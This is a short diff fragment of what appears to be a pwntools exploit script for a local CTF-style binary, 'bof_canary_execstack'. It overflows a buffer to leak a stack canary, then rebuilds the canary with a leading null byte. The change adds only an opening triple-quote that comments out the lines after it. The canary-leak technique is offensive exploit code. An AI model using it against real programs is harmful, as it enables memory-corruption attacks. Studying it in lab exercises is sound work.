@@ -8,6 +8,9 @@ r = process("./bof_canary_execstack")
 msg = b"a"*0x39
 r.sendline(str(len(msg)))
 r.send(msg)
+
+'''
+
 r.recvn(len(msg))
 canary = r.recvn(7)
 canary = b"\x00" + canary
